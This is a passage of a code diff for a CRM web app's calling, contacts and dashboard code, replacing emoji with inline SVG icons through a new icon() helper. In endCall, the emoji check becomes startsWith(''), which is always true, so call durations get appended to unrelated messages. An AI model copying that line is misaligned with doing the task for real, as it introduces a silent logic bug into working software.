+  settings: '<circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1-2.83 2.83l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-4 0v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1 0-4h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 2.83-2.83l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 4 0v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 0 4h-.09a1.65 1.65 0 0 0-1.51 1z"/>',
+  wrench: '<path d="M14.7 6.3a1 1 0 0 0 0 1.4l1.6 1.6a1 1 0 0 0 1.4 0l3.77-3.77a6 6 0 0 1-7.94 7.94l-6.91 6.91a2.12 2.12 0 0 1-3-3l6.91-6.91a6 6 0 0 1 7.94-7.94l-3.76 3.76z"/>',
+  bell: '<path d="M18 8a6 6 0 0 0-12 0c0 7-3 9-3 9h18s-3-2-3-9"/><path d="M13.73 21a2 2 0 0 1-3.46 0"/>',
+  twitter: '<path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"/>',
+  music: '<path d="M9 18V5l12-2v13"/><circle cx="6" cy="18" r="3"/><circle cx="18" cy="16" r="3"/>',
+  flame: '<path d="M8.5 14.5A2.5 2.5 0 0 0 11 12c0-1.38-.5-2-1-3-1.072-2.143-.224-4.054 2-6 .5 2.5 2 4.9 4 6.5 2 1.6 3 3.5 3 5.5a7 7 0 1 1-14 0c0-1.153.433-2.294 1-3a2.5 2.5 0 0 0 2.5 2.5z"/>',
+  image: '<rect x="3" y="3" width="18" height="18" rx="2" ry="2"/><circle cx="8.5" cy="8.5" r="1.5"/><polyline points="21 15 16 10 5 21"/>',
+  camera: '<path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"/><circle cx="12" cy="13" r="4"/>',
+  megaphone: '<path d="M3 11l18-5v12L3 14v-3z"/><path d="M11.6 16.8a3 3 0 1 1-5.8-1.6"/>',
+  alert: '<path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/>',
+  pin: '<path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"/><circle cx="12" cy="10" r="3"/>',
+  file: '<path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/>',
+  book: '<path d="M4 19.5A2.5 2.5 0 0 1 6.5 17H20"/><path d="M6.5 2H20v20H6.5A2.5 2.5 0 0 1 4 19.5v-15A2.5 2.5 0 0 1 6.5 2z"/>',
+  package: '<line x1="16.5" y1="9.4" x2="7.5" y2="4.21"/><path d="M21 16V8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16z"/><polyline points="3.27 6.96 12 12.01 20.73 6.96"/><line x1="12" y1="22.08" x2="12" y2="12"/>',
+  mic: '<path d="M12 1a3 3 0 0 0-3 3v8a3 3 0 0 0 6 0V4a3 3 0 0 0-3-3z"/><path d="M19 10v2a7 7 0 0 1-14 0v-2"/><line x1="12" y1="19" x2="12" y2="23"/><line x1="8" y1="23" x2="16" y2="23"/>',
+  hand: '<path d="M18 11V6a2 2 0 0 0-4 0M14 10V4a2 2 0 0 0-4 0v2M10 10.5V6a2 2 0 0 0-4 0v8"/><path d="M18 8a2 2 0 1 1 4 0v6a8 8 0 0 1-8 8h-2c-2.8 0-4.5-.86-5.99-2.34l-3.6-3.6a2 2 0 0 1 2.83-2.82L7 15"/>',
+};
+function icon(name, size=14){
+  const path = ICON_PATHS[name];
+  if(!path) return '';
+  return `<svg width="${size}" height="${size}" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" style="display:inline-block;vertical-align:-2px;flex-shrink:0">${path}</svg>`;
+}
+
 // ═══════════════════════════════════════════════
 // SUPABASE CONFIG
 // ═══════════════════════════════════════════════
@@ -3095,7 +3152,7 @@ function pNameOrPhone(s){
   return looksLikePhone(s) ? pPhone(s) : pName(s);
 }
 // Mask any phone-number-shaped substring inside arbitrary text (used for the
-// conversation preview body, which embeds call-log strings like "📞 Outbound
+// conversation preview body, which embeds call-log strings like " Outbound
 // call to +12523907157"). Off when privacyMode is off.
 function pMaskPhonesInText(text){
   if(!text) return '';
@@ -3675,13 +3732,13 @@ async function applyAudioDevice(type){
   if(type === 'input'){
     preferredInputDevice = deviceId;
     localStorage.setItem('crm-audio-input', deviceId);
-    showToast('🎙 Microphone updated — takes effect on next call');
+    showToast(' Microphone updated — takes effect on next call');
   } else {
     preferredOutputDevice = deviceId;
     localStorage.setItem('crm-audio-output', deviceId);
     const audio = document.getElementById('remote-audio');
     if(audio && deviceId && audio.setSinkId) audio.setSinkId(deviceId).catch(()=>{});
-    showToast('🔊 Speaker updated');
+    showToast(' Speaker updated');
   }
 }
 
@@ -3766,7 +3823,7 @@ function fmtLastActivity(act){
   const d = new Date(ts);
   const dateStr = d.toLocaleDateString([], {month:'short',day:'numeric',year:'numeric'});
   const timeStr = d.toLocaleTimeString([], {hour:'numeric',minute:'2-digit'});
-  const typeIcon = {call:'📞',email:'📧',sms:'💬',update:'✏️'}[type] || '';
+  const typeIcon = {call:icon('phone'),email:icon('mail'),sms:icon('message'),update:icon('pencil')}[type] || '';
   return `<div style="line-height:1.35">${typeIcon} ${dateStr}<br><span style="font-size:10px;opacity:.7">${timeStr}</span></div>`;
 }
 
@@ -3788,7 +3845,7 @@ function renderCallHistory(){
     return;
   }
   el.innerHTML=callHistory.slice(0,20).map(c=>{
-    const icon = c.direction==='inbound'
+    const dirIc = c.direction==='inbound'
       ? (c.status==='missed'?'<span style="color:var(--red)">↙</span>':'<span style="color:var(--green)">↙</span>')
       : (c.status==='failed'?'<span style="color:var(--red)">↗</span>':'<span style="color:var(--accent2)">↗</span>');
     const statusColor = c.status==='missed'||c.status==='failed' ? 'var(--red)' : 'var(--text3)';
@@ -3807,11 +3864,11 @@ function renderCallHistory(){
     const titleAttr = contact ? 'Open contact' : 'Open caller details';
     const fromHtml = callFromHtml(c);
     return `<div class="call-hist-item" onclick="${onClick}" title="${titleAttr}">
-      <span style="font-size:14px;width:16px;text-align:center;flex-shrink:0">${icon}</span>
+      <span style="font-size:14px;width:16px;text-align:center;flex-shrink:0">${dirIc}</span>
       <div style="flex:1;min-width:0">
         <div style="font-size:11px;font-weight:500;color:var(--text);overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${title}</div>
         <div style="font-size:10px;color:var(--text3);overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${sub}</div>
-        ${fromHtml?`<div style="font-size:9px;color:var(--text3);opacity:.8;overflow:hidden;text-overflow:ellipsis;white-space:nowrap" title="Line used">📲 ${fromHtml}</div>`:''}
+        ${fromHtml?`<div style="font-size:9px;color:var(--text3);opacity:.8;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;display:flex;align-items:center;gap:3px" title="Line used">${icon('smartphone')} ${fromHtml}</div>`:''}
       </div>
       <div style="font-size:10px;color:${statusColor};flex-shrink:0">${detail}</div>
     </div>`;
@@ -4061,7 +4118,7 @@ function matchDialpadContact(num){
   const el = document.getElementById('dialpad-contact-match'); if(!el) return;
   if(!num){ el.textContent=''; return; }
   const match = contacts.find(c=>c.phone&&c.phone.replace(/\D/g,'').includes(num.replace(/\D/g,'')));
-  el.textContent = match ? `📋 ${match.name}` : '';
+  el.textContent = match ? `${icon('clipboard')} ${match.name}` : '';
 }
 
 function initiateCall(contactId, phone, name){
@@ -4070,7 +4127,7 @@ function initiateCall(contactId, phone, name){
   if(input) input.value = phone;
   openDialpad();
   const matchEl = document.getElementById('dialpad-contact-match');
-  if(matchEl) matchEl.textContent = `📋 ${name}`;
+  if(matchEl) matchEl.textContent = `${icon('clipboard')} ${name}`;
 }
 
 async function initSWClient(force = false){
@@ -4612,7 +4669,7 @@ async function acceptIncomingCall(){
   openDialpad();
   setCallActive(displayName, from);
   try {
-    showToast('📞 Connecting…');
+    showToast(' Connecting…');
     swCall = await invite.accept({
       rootElement: document.getElementById('sw-root-element'),
       audio: true, video: false
@@ -4623,7 +4680,7 @@ async function acceptIncomingCall(){
       let conv=conversations.find(c=>c.contactId===activeCallContact.id);
       if(!conv){conv={id:'conv_'+Date.now(),contactId:activeCallContact.id,messages:[]};conversations.push(conv);}
       const _toDisp = ourLine ? ` to ${(typeof fmtPhoneDisplay === 'function' ? fmtPhoneDisplay(ourLine) : ourLine)}` : '';
-      conv.messages.push({id:'msg_'+Date.now(),ch:'sms',dir:'inbound',body:`📞 Inbound call from ${from||'unknown'}${_toDisp}`,ts:new Date().toISOString(),status:'received'});
+      conv.messages.push({id:'msg_'+Date.now(),ch:'sms',dir:'inbound',body:`${icon('phone')} Inbound call from ${from||'unknown'}${_toDisp}`,ts:new Date().toISOString(),status:'received'});
       saveConversations();
     }
   } catch(e){
@@ -4714,7 +4771,7 @@ async function startCall(){
       <div class="modal-head"><div class="modal-title">Connect SignalWire to Make Calls</div><span class="modal-close" onclick="closeModal()">×</span></div>
       <div class="modal-body">
         <div style="text-align:center;padding:16px 0">
-          <div style="font-size:40px;margin-bottom:12px">📞</div>
+          <div style="font-size:40px;margin-bottom:12px">${icon('phone')}</div>
           <div style="font-size:14px;font-weight:600;color:var(--text);margin-bottom:8px">SignalWire not connected</div>
           <div style="font-size:13px;color:var(--text3);line-height:1.7">Connect your SignalWire account in Integrations to make real phone calls.</div>
         </div>
@@ -4735,7 +4792,7 @@ async function startCall(){
   setCallActive(contactName, number);
 
   try {
-    showToast('📞 Connecting…');
+    showToast(' Connecting…');
     logError('startCall_step', '1_init_client', null, { to: dialTo });
 
     // Wrapper handles dial + start + expired-token refresh/retry
@@ -4748,7 +4805,7 @@ async function startCall(){
       if(!conv){conv={id:'conv_'+Date.now(),contactId:activeCallContact.id,messages:[]};conversations.push(conv);}
       const _fromLine = (typeof getDialerActiveNumber === 'function' ? getDialerActiveNumber() : '');
       const _fromDisp = _fromLine ? ` from ${(typeof fmtPhoneDisplay === 'function' ? fmtPhoneDisplay(_fromLine) : _fromLine)}` : '';
-      conv.messages.push({id:'msg_'+Date.now(),ch:'sms',dir:'outbound',body:`📞 Outbound call to ${number}${_fromDisp}`,ts:new Date().toISOString(),status:'sent'});
+      conv.messages.push({id:'msg_'+Date.now(),ch:'sms',dir:'outbound',body:`${icon('phone')} Outbound call to ${number}${_fromDisp}`,ts:new Date().toISOString(),status:'sent'});
       saveConversations();
     }
   } catch(e){
@@ -4861,7 +4918,7 @@ function endCall(){
     let conv=conversations.find(c=>c.contactId===activeCallContact.id);
     if(conv){
       const last=conv.messages[conv.messages.length-1];
-      if(last&&last.body.startsWith('📞')) last.body+=` — Duration: ${m}:${s}`;
+      if(last&&last.body.startsWith('')) last.body+=` — Duration: ${m}:${s}`;
       saveConversations();
     }
   }
@@ -4900,7 +4957,7 @@ function toggleMute(){
   document.getElementById('call-mute-btn')?.classList.toggle('muted',callMuted);
   document.getElementById('dp-mute-btn')?.classList.toggle('muted',callMuted);
   document.getElementById('dp-mute-label').textContent=callMuted?'Unmute':'Mute';
-  showToast(callMuted?'🔇 Muted':'🔊 Unmuted');
+  showToast(callMuted?' Muted':' Unmuted');
 }
 
 function sendDTMF(digit){
@@ -4927,7 +4984,7 @@ function sendDTMF(digit){
 let activeSourceFilters = new Set();
 let activePipelineFilter = null;
 
-// ── EDITABLE STATUSES & SOURCES (managed via the Contacts gear ⚙) ──
+// ── EDITABLE STATUSES & SOURCES (managed via the Contacts gear ) ──
 let contactStatuses = JSON.parse(localStorage.getItem('nlm_contact_statuses')||'null') || [
   {value:'new',    label:'New',    color:'pill-new'},
   {value:'active', label:'Active', color:'pill-active'},
@@ -5484,7 +5541,7 @@ function renderContacts(){
     const selCell = `<td style="width:28px;padding-left:10px;padding-right:0">
       <input type="checkbox" class="contact-row-checkbox" data-id="${c.id}" ${isSelected?'checked':''} onclick="event.stopPropagation()" onchange="toggleContactSelection('${c.id}', this.checked)" style="cursor:pointer"/>
     </td>`;
-    return `<tr ${isSelected?'class="row-selected"':''}>${selCell}${cols.map(id=>cm[id]||"<td>—</td>").join("")}<td style="white-space:nowrap"><button class="btn btn-sm" onclick="openContactDetail('${c.id}')">View</button> <button class="btn btn-sm" style="font-size:11px" onclick="openConvWithContact('${c.id}')">💬</button></td></tr>`;
+    return `<tr ${isSelected?'class="row-selected"':''}>${selCell}${cols.map(id=>cm[id]||"<td>—</td>").join("")}<td style="white-space:nowrap"><button class="btn btn-sm" onclick="openContactDetail('${c.id}')">View</button> <button class="btn btn-sm" style="font-size:11px" onclick="openConvWithContact('${c.id}')">${icon('message')}</button></td></tr>`;
   }).join("");
   renderContactTagFilters();
   syncBulkActionBar();
@@ -5692,7 +5749,7 @@ async function saveContact(id, tab, keepOpen=false) {
         await sb.patch('contacts', id, {name,first_name:firstName,last_name:lastName,company,email,phone,source,status,last_activity:lastAct});
         const c = contacts.find(x=>x.id===id);
         if(c) Object.assign(c,{name,first_name:firstName,last_name:lastName,company,email,phone,source,status,last_activity:lastAct});
-        showToast('Contact updated! ✅');
+        showToast('Contact updated! ');
       } else {
         const res = await sb.post('contacts', {name,first_name:firstName,last_name:lastName,company,email,phone,source,status,tags:[],custom_fields:{},last_activity:lastAct});
         contacts.unshift({...res[0], tags:[], customFields:{}});
@@ -5713,7 +5770,7 @@ async function saveContact(id, tab, keepOpen=false) {
       await sb.patch('contacts', id, { custom_fields: cf });
       c.customFields = cf;
       renderContacts();
-      showToast('Custom fields saved! ✅');
+      showToast('Custom fields saved! ');
       if(!keepOpen){ window._modalLocked=false; closeModalForce(); }
     } catch(e) { showToast('Error saving fields','error'); }
   } else {
@@ -5826,7 +5883,7 @@ function csSaveSettings(){
   saveContactSources();
   closeModal();
   renderContacts();
-  showToast('Contact settings saved ✅');
+  showToast('Contact settings saved ');
 }
 
 // ─── CONTACT DETAIL PANEL ───
@@ -5995,10 +6052,10 @@ function openContactDetail(contactId, tab='info') {
       ${msgs.length ? msgs.map(m=>{
         const d=new Date(m.ts);
         const timeStr=d.toLocaleDateString([],{month:'short',day:'numeric'})+' '+d.toLocaleTimeString([],{hour:'2-digit',minute:'2-digit'});
-        const icon = m.ch==='email'?'📧':'💬';
+        const chIc = m.ch==='email'?icon('mail'):icon('message');
         const dir = m.dir==='inbound'?'←':'→';
         return `<div style="padding:8px 0;border-bottom:1px solid var(--border);display:flex;gap:8px;align-items:flex-start">
-          <span style="font-size:14px;flex-shrink:0">${icon}</span>
+          <span style="font-size:14px;flex-shrink:0">${chIc}</span>
           <div style="flex:1;min-width:0">
             <div style="font-size:11px;color:var(--text3)">${dir} ${timeStr} · <span style="color:var(--accent2)">${m.status||'sent'}</span></div>
             ${m.subject?`<div style="font-size:12px;font-weight:500;color:var(--text);margin-top:2px">${m.subject}</div>`:''}
@@ -6078,7 +6135,7 @@ async function saveContactDetail(contactId){
   try {
     await sb.patch('contacts', contactId, {name,first_name:firstName,last_name:lastName,company,email,phone,source,status,last_activity:lastAct,...clientPatch});
     Object.assign(c, {name,first_name:firstName,last_name:lastName,company,email,phone,source,status,last_activity:lastAct,...clientPatch});
-    showToast('Contact saved! ✅');
+    showToast('Contact saved! ');
     renderContacts();
     if(typeof renderClientsPage === 'function') renderClientsPage();
     openContactDetail(contactId,'info'); // refresh drawer
@@ -6108,7 +6165,7 @@ async function addContactToPipeline(contactId){
     });
     const newDeal = {...res[0], stage:stageId, contactId, tags:[], customFields:{}};
     pl.deals.push(newDeal);
-    showToast(`✅ "${dealName}" added to ${pl.name}!`);
+    showToast(`${icon('check')} "${dealName}" added to ${pl.name}!`);
     openContactDetail(contactId,'pipeline');
     renderBoard();
   } catch(e){ showToast('Error adding to pipeline','error'); console.error(e); }
@@ -6141,16 +6198,16 @@ function openUnknownNumberDetail(rawNumber){
   const historyRows = past.length
     ? past.slice(0, 20).map(c => {
         const isIn = c.direction === 'inbound';
-        const icon = isIn
+        const dirIc = isIn
           ? (c.status==='missed' ? '<span style="color:var(--red)">↙</span>' : '<span style="color:var(--green)">↙</span>')
           : (c.status==='failed' ? '<span style="color:var(--red)">↗</span>' : '<span style="color:var(--accent2)">↗</span>');
         const detail = c.status==='missed' ? 'Missed' : c.status==='failed' ? 'Failed' : (c.duration ? fmtDuration(c.duration) : 'Connected');
         const fromHtml = callFromHtml(c);
         return `<div style="display:flex;align-items:center;gap:10px;padding:8px 10px;border-bottom:1px solid var(--border);font-size:12px">
-          <span style="width:16px;text-align:center;flex-shrink:0;font-size:14px">${icon}</span>
+          <span style="width:16px;text-align:center;flex-shrink:0;font-size:14px">${dirIc}</span>
           <div style="flex:1;min-width:0">
             <div style="color:var(--text)">${isIn?'Inbound':'Outbound'}</div>
-            <div style="font-size:10px;color:var(--text3)">${fmtCallTime(c.ts)}${fromHtml?` · 📲 ${fromHtml}`:''}</div>
+            <div style="font-size:10px;color:var(--text3)">${fmtCallTime(c.ts)}${fromHtml?` · ${icon('smartphone')} ${fromHtml}`:''}</div>
           </div>
           <div style="font-size:11px;color:var(--text3);flex-shrink:0">${detail}</div>
         </div>`;
@@ -6160,7 +6217,7 @@ function openUnknownNumberDetail(rawNumber){
   document.getElementById('detail-drawer').innerHTML = `
     <div class="detail-head" style="flex-shrink:0">
       <div style="display:flex;align-items:center;gap:12px">
-        <div class="detail-avatar" style="background:var(--bg4);color:var(--text3)">☎</div>
+        <div class="detail-avatar" style="background:var(--bg4);color:var(--text3)">${icon('phone')}</div>
         <div>
           <div style="font-size:16px;font-weight:700;color:var(--text)">${phoneFmt}</div>
           <div style="font-size:12px;color:var(--text3)">Not in your contacts</div>
@@ -6269,7 +6326,7 @@ function renderContactFollowupsHTML(contactId){
     return `<div onclick="openFollowupModal('${contactId}','${ev.id}')"
       style="display:flex;align-items:flex-start;gap:10px;padding:8px 10px;background:var(--bg3);border:1px solid var(--border);border-radius:var(--radius);cursor:pointer;margin-bottom:6px;transition:border-color .15s"
       onmouseenter="this.style.borderColor='var(--accent-border)'" onmouseleave="this.style.borderColor='var(--border)'">
-      ${ev.followupType ? followupTypeChip(ev.followupType) : '<span style="font-size:14px;line-height:1.1;margin-top:1px">📅</span>'}
+      ${ev.followupType ? followupTypeChip(ev.followupType) : '<span style="font-size:14px;line-height:1.1;margin-top:1px"></span>'}
       <div style="flex:1;min-width:0">
         <div style="font-size:12px;font-weight:500;color:var(--text)">${dateStr} · ${timeStr}</div>
         ${note?`<div style="font-size:11px;color:var(--text3);margin-top:2px;white-space:pre-wrap">${note}</div>`:''}
@@ -6285,7 +6342,7 @@ function renderContactNotes(contactId){
   const c = contacts.find(x=>x.id===contactId);
   if(!c) return;
   if(!Array.isArray(c.notes)) c.notes = [];
-  // Hide legacy auto-notes ("📅 Follow-up …"). Follow-ups now live solely on
+  // Hide legacy auto-notes (" Follow-up …"). Follow-ups now live solely on
   // the Activity tab's Follow-ups section.
   const visibleNotes = c.notes.filter(n => !_isFollowupAutoNote(n.text));
   if(visibleNotes.length === 0){
@@ -6310,8 +6367,8 @@ function renderContactNotes(contactId){
     return `<div style="${sep}padding:10px 0">
       <div style="font-size:13px;color:var(--text);line-height:1.55;white-space:pre-wrap;word-break:break-word">${safeText}</div>
       <div style="display:flex;align-items:center;gap:8px;margin-top:5px;flex-wrap:wrap">
-        <span style="font-size:10px;color:var(--text3)">🕐 Added ${fmtNoteTime(n.created_at)}</span>
-        ${n.edited_at ? `<span style="font-size:10px;color:var(--amber)">✏️ Edited ${fmtNoteTime(n.edited_at)}</span>` : ''}
+        <span style="font-size:10px;color:var(--text3)">${icon('clock')} Added ${fmtNoteTime(n.created_at)}</span>
+        ${n.edited_at ? `<span style="font-size:10px;color:var(--amber)">${icon('pencil')} Edited ${fmtNoteTime(n.edited_at)}</span>` : ''}
         <span style="flex:1"></span>
         <button class="btn btn-sm" style="font-size:10px;padding:2px 7px" onclick="editContactNote('${contactId}','${n.id}')">Edit</button>
         <button class="btn btn-sm" style="font-size:10px;padding:2px 7px;color:var(--red)" onclick="deleteContactNote('${contactId}','${n.id}')">Delete</button>
@@ -6337,7 +6394,7 @@ async function addContactNote(contactId){
   try {
     await sb.patch('contacts', contactId, { notes:c.notes });
     touchContactActivity(contactId, 'update');
-    showToast('Note added ✅');
+    showToast('Note added ');
   } catch(e){ showToast('Error saving note','error'); }
 }
 
@@ -6369,7 +6426,7 @@ async function saveContactNoteEdit(contactId, noteId){
   try {
     await sb.patch('contacts', contactId, { notes:c.notes });
     touchContactActivity(contactId, 'update');
-    showToast('Note updated ✅');
+    showToast('Note updated ');
   } catch(e){ showToast('Error saving note','error'); }
 }
 
@@ -6427,8 +6484,8 @@ function renderPipelineTabs(){
         </div>
       </div>
       <div class="pl-pipeline-actions" onclick="event.stopPropagation()">
-        <div class="pl-pipeline-action" onclick="editPipelineModal('${p.id}')" title="Edit pipeline">✏️</div>
-        <div class="pl-pipeline-action danger" onclick="deletePipelineConfirm('${p.id}')" title="Delete pipeline">🗑</div>
+        <div class="pl-pipeline-action" onclick="editPipelineModal('${p.id}')" title="Edit pipeline">${icon('pencil')}</div>
+        <div class="pl-pipeline-action danger" onclick="deletePipelineConfirm('${p.id}')" title="Delete pipeline">${icon('trash')}</div>
       </div>
     </div>`;
   }).join('');
@@ -7232,8 +7289,8 @@ function renderSubscriptionsCard(){
       <td style="padding:9px 8px;font-size:12px;white-space:nowrap">${renewCell}</td>
       <td style="padding:9px 8px;text-align:right;white-space:nowrap">
         <button class="btn btn-sm" onclick="toggleSubStatus('${s.id}')" title="${cancelled?'Reactivate':'Mark cancelled'}" style="font-size:10px;padding:2px 8px">${cancelled?'Cancelled':'Active'}</button>
-        <button class="btn btn-sm" onclick="openSubModal('${s.id}')" title="Edit" style="padding:2px 8px">✎</button>
-        <button class="btn btn-sm" onclick="deleteSub('${s.id}')" title="Delete" style="padding:2px 8px;color:var(--red)">🗑</button>
+        <button class="btn btn-sm" onclick="openSubModal('${s.id}')" title="Edit" style="padding:2px 8px">${icon('pencil')}</button>
+        <button class="btn btn-sm" onclick="deleteSub('${s.id}')" title="Delete" style="padding:2px 8px;color:var(--red)">${icon('trash')}</button>
       </td>
     </tr>`;
   }).join('');
@@ -7242,7 +7299,7 @@ function renderSubscriptionsCard(){
     <div class="settings-card">
       <div class="settings-card-head">
         <div>
-          <div class="settings-card-title">Subscriptions &amp; Expenses 🔒</div>
+          <div class="settings-card-title">Subscriptions &amp; Expenses ${icon('lock')}</div>
           <div class="settings-card-sub">Private to you — track your recurring monthly costs</div>
         </div>
         <button class="btn btn-primary btn-sm" onclick="openSubModal()">+ Add</button>
@@ -7520,13 +7577,13 @@ function renderUsageRecommendation(data){
   const biggest = [...data.tables].sort((a,b) => b.bytes - a.bytes)[0];
 
   if(data.usage_pct >= 90){
-    lines.push('🚨 <strong>Critical:</strong> You\'re using over 90% of your free tier. Upgrade to Supabase Pro (8 GB DB) or clean up data.');
+    lines.push(icon('alert')+' <strong>Critical:</strong> You\'re using over 90% of your free tier. Upgrade to Supabase Pro (8 GB DB) or clean up data.');
   } else if(data.usage_pct >= 70){
-    lines.push('⚠️ <strong>Warning:</strong> You\'re past 70% of the free tier. Plan for an upgrade soon.');
+    lines.push(icon('alert')+' <strong>Warning:</strong> You\'re past 70% of the free tier. Plan for an upgrade soon.');
   } else if(data.usage_pct >= 40){
-    lines.push('📊 You\'re at a healthy ~' + Math.round(data.usage_pct) + '% — plenty of room.');
+    lines.push(icon('chart')+' You\'re at a healthy ~' + Math.round(data.usage_pct) + '% — plenty of room.');
   } else {
-    lines.push('✅ Storage is comfortable — using ' + data.usage_pct.toFixed(1) + '% of the free tier.');
+    lines.push(icon('check')+' Storage is comfortable — using ' + data.usage_pct.toFixed(1) + '% of the free tier.');
   }
 
   // Project time to limit
@@ -7545,17 +7602,17 @@ function renderUsageRecommendation(data){
   // Cleanup suggestion for the biggest table
   if(biggest && biggest.bytes > 1024*1024){ // >1MB
     if(biggest.name === 'error_logs'){
-      lines.push(`💡 <strong>Cleanup tip:</strong> Error logs are your biggest table (${fmtBytes(biggest.bytes)}). Old logs are usually safe to delete — they help with active debugging only.`);
+      lines.push(`${icon('bulb')} <strong>Cleanup tip:</strong> Error logs are your biggest table (${fmtBytes(biggest.bytes)}). Old logs are usually safe to delete — they help with active debugging only.`);
     } else if(biggest.name === 'conversations'){
-      lines.push(`💡 <strong>Cleanup tip:</strong> Conversations take up ${fmtBytes(biggest.bytes)}. Old/archived threads can be exported and removed if needed.`);
+      lines.push(`${icon('bulb')} <strong>Cleanup tip:</strong> Conversations take up ${fmtBytes(biggest.bytes)}. Old/archived threads can be exported and removed if needed.`);
     } else {
-      lines.push(`💡 Largest table: <strong>${biggest.label}</strong> (${fmtBytes(biggest.bytes)}).`);
+      lines.push(`${icon('bulb')} Largest table: <strong>${biggest.label}</strong> (${fmtBytes(biggest.bytes)}).`);
     }
   }
 
   // Upgrade hint
   if(data.usage_pct >= 60){
-    lines.push('🔧 <strong>Upgrade path:</strong> Supabase Pro is $25/mo for 8 GB DB + 100 GB storage — 16× the free tier.');
+    lines.push(icon('wrench')+' <strong>Upgrade path:</strong> Supabase Pro is $25/mo for 8 GB DB + 100 GB storage — 16× the free tier.');
   }
 
   el.innerHTML = lines.join('<br>');
@@ -7658,7 +7715,7 @@ function removeUser(userId){
         </ul>
       </div>
       <div style="background:var(--red-bg);border:1px solid rgba(255,77,109,.25);border-radius:var(--radius);padding:10px;font-size:12px;color:var(--red);font-weight:500;margin-bottom:14px">
-        ⚠️ This cannot be undone.
+        ${icon('alert')} This cannot be undone.
       </div>
       <div class="form-group">
         <label class="form-label">Type <strong style="color:var(--text)">${safeName}</strong> to confirm:</label>
@@ -7785,16 +7842,16 @@ function saveWorkspace(){
 // DASHBOARD WIDGETS
 // ═══════════════════════════════════════════════
 const WIDGET_CATALOG=[
-  {id:'stat-leads',label:'Total Leads',icon:'👥',desc:'Count of all contacts',section:'Contacts',size:'w-col-3'},
-  {id:'stat-deals',label:'Active Deals',icon:'🤝',desc:'Deals in pipeline',section:'Pipeline',size:'w-col-3'},
-  {id:'stat-revenue',label:'Est. Revenue',icon:'💰',desc:'Total deal value',section:'Pipeline',size:'w-col-3'},
-  {id:'stat-emails',label:'Emails Sent',icon:'📧',desc:'Campaign emails',section:'Campaigns',size:'w-col-3'},
-  {id:'activity',label:'Recent Activity',icon:'🕐',desc:'Latest CRM events',section:'Dashboard',size:'w-col-6'},
-  {id:'tasks',label:'Upcoming Tasks',icon:'✅',desc:'Scheduled tasks',section:'Dashboard',size:'w-col-4'},
-  {id:'quick-actions',label:'Quick Actions',icon:'⚡',desc:'Shortcut buttons',section:'Dashboard',size:'w-col-4'},
-  {id:'contacts-list',label:'Recent Contacts',icon:'👤',desc:'Latest contacts',section:'Contacts',size:'w-col-6'},
-  {id:'pipeline-mini',label:'Pipeline Overview',icon:'📊',desc:'Stage-by-stage count',section:'Pipeline',size:'w-col-6'},
-  {id:'automations',label:'Automations',icon:'🤖',desc:'Workflow status',section:'Automations',size:'w-col-6'},
+  {id:'stat-leads',label:'Total Leads',icon:icon('users'),desc:'Count of all contacts',section:'Contacts',size:'w-col-3'},
+  {id:'stat-deals',label:'Active Deals',icon:icon('users'),desc:'Deals in pipeline',section:'Pipeline',size:'w-col-3'},
+  {id:'stat-revenue',label:'Est. Revenue',icon:icon('dollar'),desc:'Total deal value',section:'Pipeline',size:'w-col-3'},
+  {id:'stat-emails',label:'Emails Sent',icon:icon('mail'),desc:'Campaign emails',section:'Campaigns',size:'w-col-3'},
+  {id:'activity',label:'Recent Activity',icon:icon('clock'),desc:'Latest CRM events',section:'Dashboard',size:'w-col-6'},
+  {id:'tasks',label:'Upcoming Tasks',icon:icon('check'),desc:'Scheduled tasks',section:'Dashboard',size:'w-col-4'},
+  {id:'quick-actions',label:'Quick Actions',icon:icon('bolt'),desc:'Shortcut buttons',section:'Dashboard',size:'w-col-4'},
+  {id:'contacts-list',label:'Recent Contacts',icon:icon('user'),desc:'Latest contacts',section:'Contacts',size:'w-col-6'},
+  {id:'pipeline-mini',label:'Pipeline Overview',icon:icon('chart'),desc:'Stage-by-stage count',section:'Pipeline',size:'w-col-6'},
+  {id:'automations',label:'Automations',icon:icon('bot'),desc:'Workflow status',section:'Automations',size:'w-col-6'},
 ];
 let activeWidgets=['stat-leads','stat-deals','stat-revenue','stat-emails','activity','tasks','pipeline-mini','quick-actions'];
 
@@ -7802,7 +7859,7 @@ function renderDashboard(){
